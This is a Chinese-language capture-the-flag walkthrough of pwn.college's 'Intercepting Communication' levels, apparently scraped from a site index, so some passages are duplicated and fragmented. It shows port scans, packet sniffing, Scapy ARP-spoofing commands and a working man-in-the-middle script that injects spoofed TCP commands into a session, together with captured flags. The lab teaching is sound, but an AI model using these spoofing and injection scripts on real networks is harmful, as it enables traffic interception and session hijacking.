pwn.college{0mowkGco5uatE6V9v8I1lPZ2xHa.dBzNzMDL2QjMyMzW} level13 Hijack traffic from a remote host using ARP \u5148\u89c2\u5bdf\u4e00\u6ce2 root@ip-10-0-0-3:~# ip a 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether e6:19:83:95:20:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.0.3/16 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::e419:83ff:fe95:20c7/64 scope link valid_lft forever preferred_lft forever root@ip-10-0-0-3:~# \u5f88\u5c2c\uff0c\u5c31\u81ea\u5df1\u778e\u505a\u628a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=\"e6:19:83:95:20:c7\", psrc=\"10.0.0.3\", pdst=\"10.0.0.4\") remote_mac = arp_response[0][1].hwsrc tcp_redirect = Ether(src=remote_mac, dst=\"e6:19:83:95:20:c7\") / IP(src=\"10.0.0.4\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=\"e6:19:83:95:20:c7\", psrc=\"10.0.0.3\", pdst=\"10.0.0.2\") remote_mac = arp_response[0][1].hwsrc tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.4\", dst=local_ip) / TCP(sport=31338, dport=31337, flags=\"PA\", seq=123456, ack=0) \u770b\u8d77\u6765\uff0c\u53c8\u662f\u5efa\u7acb\u94fe\u63a5\uff1f sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, seq=31337, flags=\"A\"),iface=\"eth0\") \u8fc7\u7a0b\u90fd\u5199\u5b8c\u4e86\uff0c\u53ef\u4ee5\u5199\u811a\u672c\u4e86 from scapy.all import * # \u83b7\u53d6\u672c\u5730\u63a5\u53e3\u7684 MAC \u548c IP \u5730\u5740 local_mac = get_if_hwaddr(\"eth0\") local_ip = get_if_addr(\"eth0\") # \u6784\u9020 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u6b3a\u9a97\u76ee\u6807\u4e3b\u673a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=local_mac, psrc=local_ip, pdst=\"10.0.0.4\") # \u53d1\u9001 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u5e76\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684 MAC \u5730\u5740 arp_response = srp(arp_request, timeout=2, iface=\"eth0\", verbose=False)[0] remote_mac = arp_response[0][1].hwsrc # \u6784\u9020 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u5c06\u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e3b\u673a tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.4\", dst=local_ip) / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) # \u53d1\u9001 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u52ab\u6301\u6d41\u91cf sendp(tcp_redirect, iface=\"eth0\") from scapy.all import * # \u83b7\u53d6\u672c\u5730\u63a5\u53e3\u7684 MAC \u548c IP \u5730\u5740 local_mac = get_if_hwaddr(\"eth0\") local_ip = get_if_addr(\"eth0\") # \u6784\u9020 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u6b3a\u9a97\u76ee\u6807\u4e3b\u673a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=local_mac, psrc=local_ip, pdst=\"10.0.0.2\") # \u53d1\u9001 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u5e76\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684 MAC \u5730\u5740 arp_response = srp(arp_request, timeout=2, iface=\"eth0\", verbose=False)[0] remote_mac = arp_response[0][1].hwsrc # \u6784\u9020 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u5c06\u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e3b\u673a tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.2\", dst=local_ip) / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) # \u53d1\u9001 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u52ab\u6301\u6d41\u91cf sendp(tcp_redirect, iface=\"eth0\") \u597d\u5427\uff0c\u6574\u4e86\u4e00\u5927\u5806\uff0c\u7136\u540e\u53d1\u73b0\u641e\u9519\u4e86\uff0c\u6ca1\u90a3\u4e48\u590d\u6742\uff0cG\u3002\u3002\u3002 \u6b63\u786e\u89e3\u7b54\u5982\u4e0b\uff1a root@ip-10-0-0-3:~# arping 10.0.0.4 ARPING 10.0.0.4 42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=0 time=17.107 usec 42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=1 time=13.761 usec ^C --- 10.0.0.4 statistics --- 2 packets transmitted, 2 packets received, 0% unanswered (0 extra) rtt min/avg/max/std-dev = 0.014/0.015/0.017/0.002 ms root@ip-10-0-0-3:~# sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ce:b6:65:76:0a:83\") / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"),psrc=\"10.0.0.2\",hwdst=\"ce:b6:65:76:0a:83\",pdst=\"10.0.0.4\"),iface=\"eth0\") pwn.college{cNTaa8AjxVE-lSXY9DgEeXxNMHz.dFzNzMDL2QjMyMzW} level14 Man-in-the-middle traffic between two remote hosts and inject extra traffic \u4ece\u8bb2\u89e3\u6765\u770b\uff0c\u8fd9\u4e2a\u9898\u7684\u6838\u5fc3\u662f\u9700\u8981\u52a0\u5165\u5bf9\u8bdd\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u76d1\u542c\uff0c\u56e0\u4e3a\u5bf9\u8bdd\u4e2d\u6709\u4e00\u6b21\u6027\u5bc6\u94a5\uff0c\u4ec5\u4ec5\u76d1\u542c\u5e76\u4e0d\u7ba1\u7528\uff0c\u91cd\u70b9\u662f\u6293\u4f4f\u7a97\u53e3\u671f\u53d1\u9001\u5305\u542b\u6709FLAG\u7684\u5305\u3002 \u76f4\u63a5\u5199\u4e2a\u811a\u672c from scapy.all import * sendp(Ether(src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"), psrc=\"10.0.0.3\",pdst=\"10.0.0.4\"),iface=\"eth0\") #tell 10.0.0.4\uff0cwhere 10.0.0.3 it is sendp(Ether(src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"), psrc=\"10.0.0.4\",pdst=\"10.0.0.3\"),iface=\"eth0\") #tell 10.0.0.3\uff0cwhere 10.0.0.4 it is packet_data = { 'key': '', 'dst': '', 'src': '', 'ipdst': '', 'ipsrc': '', 'ipflags': '', 'sport': 0, 'dport': 31337, 'flags': '', 'seq': 0, 'ack': 0 } def CallBack(packet): if packet.haslayer('TCP'): tcp = packet['TCP'] ip = packet['IP'] ether = packet['Ethernet'] load = tcp.load if hasattr(tcp, 'load') else b'' if ip.src == '10.0.0.4' and load != b'ECHO\\n': packet_data['key'] = load if ip.src == '10.0.0.3' and load == b'COMMANDS:\\nECHO\\nFLAG\\nCOMMAND:\\n': print(\"WARNING!!\") packet_data.update({ 'ipdst': ip.src, 'ipsrc': ip.dst, 'flags': 'PA', 'ipflags': ip.flags, 'dst': ether.src, 'src': ether.dst, 'dport': tcp.sport, 'sport': tcp.dport, 'seq': tcp.ack, 'ack': tcp.seq + 29 }) raw_pkt = Raw(load='FLAG\\n') (Ether(src=packet_data['src'], dst=packet_data['dst']) / IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) / TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) / raw_pkt).display() sendp(Ether(src=packet_data['src'], dst=packet_data['dst']) / IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) / TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) / raw_pkt, iface=\"eth0\") sniff(filter=\"tcp\", prn=CallBack, iface='eth0', count=100) \u7136\u540e\u987a\u5229\u62ff\u5230flag pwn.college{A3pb7kfH8On2sOV2_hSlPGWG_P8.dJzNzMDL2QjMyMzW} \u53ef\u4ee5\u770b\u8fd9\u4e2a \u89c6\u9891\u8bb2\u89e3 \u788e\u788e\u5ff5\uff1a\u8fd9\u4e2a\u90e8\u5206\u5176\u5b9e\u4e0d\u592a\u96be\uff0c\u91cd\u70b9\u662f\u5b66\u4f1ascapy\u5373\u53ef\uff0c\u4f46\u662f\u8be1\u5f02\u7684\u5730\u65b9\u5728\u4e8e\u5fc5\u987b\u4f7f\u7528tmux\uff0c\u597d\u50cf\u8fd9\u6837\u624d\u80fd\u5728\u4e00\u4e2a\u7236\u7ebf\u7a0b\u4e4b\u4e0b\uff0c\u4e0d\u7136\u4f60\u5728\u53e6\u4e00\u4e2ashell\u91cc\u9762\u4f7f\u7528python\u811a\u672c\uff0c\u8fd9\u4e2ashell\u91cc\u9762\u7684tcpdump\u6293\u4e0d\u5230\u4e1c\u897f\u3002\u8fd9\u66fe\u7ecf\u56f0\u6270\u4e86\u6211\u5f88\u4e45\uff0c\u522b\u7684\u5c31\u6ca1\u5565\u4e86\u3002","title":"Knowledge"},{"location":"CSE365/Intercepting%20Communication/#knowledge","text":"\u8fd9\u4e00\u90e8\u5206\u662f\u4e00\u4e2a\u6781\u7b80\u7248\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u77e5\u8bc6\u3002 \u5927\u6982\u610f\u601d\u662f\u4f60\u9700\u8981\u5efa\u7acb\u4e00\u4e2a\u56db\u5c42\u7f51\u7edc\u6a21\u578b\u7684\u6982\u5ff5\uff0c\u7136\u540e\u5efa\u7acb\u8d77\u6bcf\u4e00\u5c42\u6240\u4f7f\u7528\u7684\u534f\u8bae\u548c\u6570\u636e\u5305\u90fd\u662f\u4ec0\u4e48 \u4ece\u4e0b\u5f80\u4e0a\u4f9d\u6b21\u662f\u8fd9\u6837\u7684\uff1a HTTP---\u5b9e\u73b0\u529f\u80fd TCP---\u8bc6\u522b\u8fdb\u7a0b IP---\u8bc6\u522b\u4e3b\u673a ARP(ETHER)---\u7269\u7406\u7f51\u5361 \u7136\u540e\u672c\u90e8\u5206\u5c31\u662f\u7814\u7a76\u4ee5\u8fd9\u4e9b\u5305\u4e3a\u57fa\u7840\u5efa\u7acb\u8d77\u7684\u901a\u8baf\u7684\u4e00\u4e9b\u8fc7\u7a0b\u3002","title":"Knowledge"},{"location":"CSE365/Intercepting%20Communication/#scapy","text":"\u53d1\u5305\u53ef\u4ee5\u770b \u8fd9\u4e2a level14\u9700\u8981\u4f7f\u7528sniff","title":"\u5b9e\u7528\u5de5\u5177scapy"},{"location":"CSE365/Intercepting%20Communication/#_1","text":"tcpdump\u5df2\u7ecf\u8db3\u591f\u597d\u7528\u4e86\uff0cwireshark\u662f\u66f4\u5f3a\u5927\u7684\u56fe\u5f62\u5316\u5de5\u5177\uff0c\u53ea\u4e0d\u8fc7\u6211\u8fde\u90a3\u4e2a\u5b9e\u9a8c\u73af\u5883\u603b\u662f\u5f88\u5361\uff0c\u6240\u4ee5\u6700\u540e\u90fd\u91c7\u53d6\u547d\u4ee4\u884c\u4e86\u3002","title":"\u5176\u4ed6"},{"location":"CSE365/Intercepting%20Communication/#wp","text":"","title":"WP"},{"location":"CSE365/Intercepting%20Communication/#level1-connect-to-a-remote-host","text":"nc 10.0.0.3 31337","title":"level1 Connect to a remote host"},{"location":"CSE365/Intercepting%20Communication/#level2-listen-for-a-connection-from-a-remote-host","text":"nc -l 31337","title":"level2 Listen for a connection from a remote host"},{"location":"CSE365/Intercepting%20Communication/#level3-find-and-connect-to-a-remote-host","text":"# \u626b\u63cf\u7aef\u53e3nmap -p 31337 10.0.0.0/24 root@ip-10-0-0-2:~# nmap -p 31337 10.0.0.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 22:54 UTC Nmap scan report for 10.0.0.47 Host is up (0.000090s latency). PORT STATE SERVICE 31337/tcp open Elite MAC Address: 1A:78:B6:5A:08:A8 (Unknown) Nmap scan report for 10.0.0.2 Host is up (0.000058s latency). PORT STATE SERVICE 31337/tcp closed Elite Nmap done: 256 IP addresses (2 hosts up) scanned in 28.46 seconds root@ip-10-0-0-2:~# nc 10.0.0.2 31337 root@ip-10-0-0-2:~# nc 10.0.0.47 31337 # \u51fa\u73b0flag","title":"level3 Find and connect to a remote host"},{"location":"CSE365/Intercepting%20Communication/#level4-find-and-connect-to-a-remote-host-on-a-large-network","text":"root@ip-10-0-0-2:~# nmap -p 31337 -T5 10.0.0.0/16 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 23:44 UTC Nmap scan report for 10.0.0.2 Host is up (0.000053s latency). PORT STATE SERVICE 31337/tcp closed Elite Nmap scan report for 10.0.211.92 Host is up (0.000093s latency). PORT STATE SERVICE 31337/tcp open Elite MAC Address: D6:5F:9A:28:AE:26 (Unknown) Nmap done: 65536 IP addresses (2 hosts up) scanned in 2583.60 seconds # \u8fd9\u4e2a\u6211\u6ca1\u5565\u597d\u529e\u6cd5\uff0c\u611f\u89c9\u65f6\u95f4\u5f88\u957f\u554a\u3002 nc 10.0.211.92 31337","title":"level4 Find and connect to a remote host on a large network"},{"location":"CSE365/Intercepting%20Communication/#level5-monitor-traffic-from-a-remote-host","text":"tcpdump -i any port 31337 # \u5148\u8fd9\u6837\u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u5305\u662f\u91cd\u590d\u7684\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u6570\u636e\u5305\u957f\u5ea6\u4e3a58\uff0c\u63a8\u6d4b\u6709\u7528 tcpdump -i any port 31337 -X # \u8fd9\u4f1a\u8f93\u51fa\u5177\u4f53\u7684\u5341\u516d\u8fdb\u5236\u548cascii\u7801 # \u7136\u540e\u5c31\u5f97\u5230\u4e86\u5177\u4f53\u7684\u5305\u4e86 01:10:28.660067 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.50004: Flags [P.], seq 1:59, ack 60, win 509, options [nop,nop,TS val 4114781018 ecr 1191307187], length 58 0x0000: 4500 006e 4d18 4000 4006 d96d 0a00 0002 E..nM.@.@..m.... 0x0010: 0a00 0003 7a69 c354 b6ab 89fa 61ea 4259 ....zi.T....a.BY 0x0020: 8018 01fd c37f 0000 0101 080a f542 935a .............B.Z 0x0030: 4701 e7b3 7077 6e2e 636f 6c6c 6567 657b G...pwn.college{ 0x0040: 5934 4a50 5173 526d 4367 4e71 636a 6e69 Y4JPQsRmCgNqcjni 0x0050: 6532 3878 7775 4961 5755 4e2e 644e 6a4e e28xwuIaWUN.dNjN 0x0060: 7a4d 444c 3251 6a4d 794d 7a57 7d0a zMDL2QjMyMzW}.","title":"level5 Monitor traffic from a remote host"},{"location":"CSE365/Intercepting%20Communication/#level6-monitor-slow-traffic-from-a-remote-host","text":"# \u8001\u89c4\u77e9\u5148\u770b\u4e00\u4e0b tcpdump -i any port 31337 # \u8fd9\u4e2a\u9898\u4e5f\u6bd4\u8f83\u6c34\u4e86\uff0c\u5c31\u662f\u6bcf\u4e2a\u5305\u53ea\u53d1\u9001\u5176\u4e2d\u7684\u4e00\u4f4d\uff0c\u7136\u540e\u4f60\u7b4958\u4e2a\u5305\uff0c\u5c31\u51d1\u9f50\u4e86\u3002 tcpdump -i any port 31337 and src 10.0.0.2 and dst 10.0.0.3 and greater 1 -X \u7136\u540e\u8f93\u51fa\u5927\u6982\u662f\u8fd9\u6837\u7684 01:32:10.535829 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 5:6, ack 6, win 510, options [nop,nop,TS val 4116082894 ecr 1192609080], length 1 0x0000: 4500 0035 9482 4000 4006 923c 0a00 0002 E..5..@.@..<.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8af feb5 c987 ....zi.j........ 0x0020: 8018 01fe eab4 0000 0101 080a f556 70ce .............Vp. 0x0030: 4715 c538 63 G..8c 01:32:11.537097 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 6:7, ack 7, win 510, options [nop,nop,TS val 4116083896 ecr 1192610081], length 1 0x0000: 4500 0035 9483 4000 4006 923b 0a00 0002 E..5..@.@..;.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b0 feb5 c988 ....zi.j........ 0x0020: 8018 01fe d6df 0000 0101 080a f556 74b8 .............Vt. 0x0030: 4715 c921 6f G..!o 01:32:12.538387 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 7:8, ack 8, win 510, options [nop,nop,TS val 4116084897 ecr 1192611083], length 1 0x0000: 4500 0035 9484 4000 4006 923a 0a00 0002 E..5..@.@..:.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b1 feb5 c989 ....zi.j........ 0x0020: 8018 01fe d20a 0000 0101 080a f556 78a1 .............Vx. 0x0030: 4715 cd0b 6c G...l 01:32:13.539649 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 8:9, ack 9, win 510, options [nop,nop,TS val 4116085898 ecr 1192612084], length 1 0x0000: 4500 0035 9485 4000 4006 9239 0a00 0002 E..5..@.@..9.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b2 feb5 c98a ....zi.j........ 0x0020: 8018 01fe ca36 0000 0101 080a f556 7c8a .....6.......V|. 0x0030: 4715 d0f4 6c G...l 01:32:14.540780 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 9:10, ack 10, win 510, options [nop,nop,TS val 4116086899 ecr 1192613085], length 1 0x0000: 4500 0035 9486 4000 4006 9238 0a00 0002 E..5..@.@..8.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b3 feb5 c98b ....zi.j........ 0x0020: 8018 01fe c962 0000 0101 080a f556 8073 .....b.......V.s 0x0030: 4715 d4dd 65 G...e 01:32:15.541382 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 10:11, ack 11, win 510, options [nop,nop,TS val 4116087900 ecr 1192614086], length 1 0x0000: 4500 0035 9487 4000 4006 9237 0a00 0002 E..5..@.@..7.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b4 feb5 c98c ....zi.j........ 0x0020: 8018 01fe bf8e 0000 0101 080a f556 845c .............V.\\ 0x0030: 4715 d8c6 67 G...g 01:32:16.542597 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 11:12, ack 12, win 510, options [nop,nop,TS val 4116088901 ecr 1192615087], length 1 0x0000: 4500 0035 9488 4000 4006 9236 0a00 0002 E..5..@.@..6.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b5 feb5 c98d ....zi.j........ 0x0020: 8018 01fe b9ba 0000 0101 080a f556 8845 .............V.E 0x0030: 4715 dcaf 65 G...e \u6211\u4eec\u5c31\u628a\u6700\u540e\u4e00\u4f4d\u62fc\u8d77\u6765\u5c31\u884c\u4e86\uff0c\u53cd\u6b63\u8fd9\u4e00\u6b65\u5927\u6982\u6709\u70b9\u513f\u70e6\uff0c\u53ef\u4ee5\u5199\u811a\u672c\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u624b\u52a8\u590d\u5236:( # \u597d\u5427\uff0c\u6211\u811a\u672c\u6ca1\u5199\u5bf9\uff0c\u81ea\u5df1\u624b\u52a8\u590d\u5236\u7684\uff0c\u5c3c\u739b pwn.college{kNJHOFI1VRpp7QOATsbMSjGQiQp.dRjNzMDL2QjMyMzW}","title":"level6 Monitor slow traffic from a remote host"},{"location":"CSE365/Intercepting%20Communication/#level7-hijack-traffic-from-a-remote-host-by-configuring-your-network-interface","text":"tcpdump -i any # \u53d1\u73b010.0.0.4\u4e00\u76f4\u5728\u53d1\u9001\u8bf7\u6c42\u3002\u8fd9\u65f6\u5019\u6211\u9a97\u5b83\u5e94\u8be5\u5c31\u884c\u4e86\u3002 ip addr add 10.0.0.2/8 dev eth0 \u7136\u540e\u53d1\u73b0\u4e86\u8fd9\u4e9b\u5305 listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes 15:07:21.562729 eth0 B ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28 15:07:21.562752 eth0 Out ARP, Reply 10.0.0.2 is-at fa:9a:ce:e8:ef:b2 (oui Unknown), length 28 15:07:21.562833 eth0 In IP 10.0.0.4.37984 > 10.0.0.2.31337: Flags [S], seq 1279607758, win 64240, options [mss 1460,sackOK,TS val 1986706165 ecr 0,nop,wscale 7], length 0 15:07:21.562843 eth0 Out IP 10.0.0.2.31337 > 10.0.0.4.37984: Flags [R.], seq 0, ack 1279607759, win 0, length 0 15:07:21.639815 lo In IP localhost.53883 > 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39) 15:07:21.639846 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.639911 lo In IP localhost.39242 > 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39) 15:07:21.639923 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.640042 lo In IP localhost.46035 > 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39) 15:07:21.640052 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.640103 lo In IP localhost.50224 > 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39) \u8fd9\u4e2aR\u8bf4\u660ereset\u4f4d\uff1a\u200b\u200b\u200b\u200b\u200b\u200b \u8868\u793aTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u5f02\u5e38\u5fc5\u987b\u5f3a\u5236\u65ad\u5f00\u8fde\u63a5\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u6ca1\u6709\u88ab\u4f7f\u7528\u7684\u7aef\u53e3\u5373\u4f7f\u53d1\u6765\u4e86\u8fde\u63a5\u8bf7\u6c42\uff0c\u4e5f\u65e0\u6cd5\u901a\u4fe1\u3002 \u7136\u540e\u76d1\u542c\u5373\u53ef nc -l 31337 \u8fd9\u9898\u770b\u4e86\u8bb2\u89e3\u624d\u4f1a\uff0c\u5c31\u5361\u5728\u4e0d\u77e5\u9053\u600e\u4e48\u770b\u8fd9\u4e2a\u6807\u5fd7\u4f4d\u4e0a\uff0c\u679c\u7136\u77e5\u8bc6\u5904\u5904\u662f\u76f2\u533a \u7136\u540e\u5728\u4f60\u76d1\u542c\u4ee5\u540e\uff0c\u5c31\u4f1a\u53d8\u6210PUSH\u6807\u5fd7\u4f4d\u3002 ///@TODO: \u5173\u4e8e\u540e\u9762\u7684\u53d1\u5305\uff0c\u6211\u6240\u6709ARP\u5565\u7684\u57fa\u672c\u4e0a\u90fd\u662f\u53d1\u9001\u7684\u5e7f\u64ad\u5730\u5740\uff0c\u8bb2\u89e3\u4e4b\u4e2d\u53d1\u9001\u7ed9\u7279\u5b9a\u5730\u5740\uff0c\u6ca1\u6709\u5fc5\u8981\uff0c\u800c\u4e14\u7531\u4e8e\u6211\u6709\u7684\u5173\u5361\u4f4f\uff0c\u5982\u679c\u53d1\u9001\u7ed9\u7279\u5b9a\u7684\u7269\u7406\u7f51\u5361\uff0c\u6211\u6bcf\u6b21\u91cd\u5f00\u6311\u6218\u90fd\u8981\u91cd\u65b0\u67e5\u770b\uff0c\u6709\u70b9\u513f\u9ebb\u70e6\u3002","title":"level7 Hijack traffic from a remote host by configuring your network interface"},{"location":"CSE365/Intercepting%20Communication/#level8-manually-send-an-ethernet-packet","text":"\u4e3b\u8981\u662f\u4f7f\u7528scapy >>> sendp(Ether(src=\"4a:b3:c7:c5:08:7d\",dst=\"ff:ff:ff:ff:ff:ff\",type=0xFFFF),iface=\"eth0\") . Sent 1 packets. pwn.college{wl9Wr84duLuF_XsCsoo6EiqhnU3.dZjNzMDL2QjMyMzW}","title":"level8 Manually send an Ethernet packet"},{"location":"CSE365/Intercepting%20Communication/#level9-manually-send-an-internet-protocol-packet","text":"\u53d1IP\u4e86 >>> sendp(Ether(src=\"52:bc:a3:08:14:d1\",dst=\"ff:ff:ff:ff:ff:ff\", type=0x0800) / IP(proto=0xFF, src=\"127.0.0.1\",dst=\"10.0.0.3\"), iface=\"eth0\") . Sent 1 packets. pwn.college{c5HrfavanBMm_0po-E47NuCoY2J.ddjNzMDL2QjMyMzW}","title":"level9 Manually send an Internet Protocol packet"},{"location":"CSE365/Intercepting%20Communication/#level10-manually-send-a-transmission-control-protocol-packet","text":">>> sendp(Ether(src=\"12:af:41:92:01:6f\",dst=\"ff:ff:ff:ff:ff:ff\", type=0x0800) / IP(src=\"127.0.0.1\", dst=\"10.0.0.3\", proto=0x06) / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags=\"APRSF\"), ...: iface=\"eth0\") . Sent 1 packets. pwn.college{gSJcnHgB4dNz17jCCuEduVjMEF_.dhjNzMDL2QjMyMzW}","title":"level10 Manually send a Transmission Control Protocol packet"},{"location":"CSE365/Intercepting%20Communication/#level11-manually-perform-a-transmission-control-protocol-handshake","text":"sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, seq=31337, flags=\"S\"),iface=\"eth0\") sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, ack=1235161237, seq=31338,flags=\"A\"),iface=\"eth0\") pwn.college{cMG0JWm3rTQmJHtfC-JNorRv6Ef.dljNzMDL2QjMyMzW} \u591a\u4e48\u7f8e\u5999\u7684\u4e00\u5f20\u56fe","title":"level11 Manually perform a Transmission Control Protocol handshake"},{"location":"CSE365/Intercepting%20Communication/#level12-manually-send-an-address-resolution-protocol-packet","text":">>> sendp(Ether(dst=\"ff:ff:ff:ff:ff:ff\", src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\", hwsrc=get_if_h ...: waddr(\"eth0\"), psrc=\"10.0.0.2\", hwdst=\"ff:ff:ff:ff:ff:ff\", pdst=\"10.0.0.3\"), iface=\"eth0\") . Sent 1 packets. pwn.college{0mowkGco5uatE6V9v8I1lPZ2xHa.dBzNzMDL2QjMyMzW}","title":"level12 Manually send an Address Resolution Protocol packet"},{"location":"CSE365/Intercepting%20Communication/#level13-hijack-traffic-from-a-remote-host-using-arp","text":"\u5148\u89c2\u5bdf\u4e00\u6ce2 root@ip-10-0-0-3:~# ip a 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether e6:19:83:95:20:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.0.3/16 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::e419:83ff:fe95:20c7/64 scope link valid_lft forever preferred_lft forever root@ip-10-0-0-3:~# \u5f88\u5c2c\uff0c\u5c31\u81ea\u5df1\u778e\u505a\u628a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=\"e6:19:83:95:20:c7\", psrc=\"10.0.0.3\", pdst=\"10.0.0.4\") remote_mac = arp_response[0][1].hwsrc tcp_redirect = Ether(src=remote_mac, dst=\"e6:19:83:95:20:c7\") / IP(src=\"10.0.0.4\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=\"e6:19:83:95:20:c7\", psrc=\"10.0.0.3\", pdst=\"10.0.0.2\") remote_mac = arp_response[0][1].hwsrc tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.4\", dst=local_ip) / TCP(sport=31338, dport=31337, flags=\"PA\", seq=123456, ack=0) \u770b\u8d77\u6765\uff0c\u53c8\u662f\u5efa\u7acb\u94fe\u63a5\uff1f sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, seq=31337, 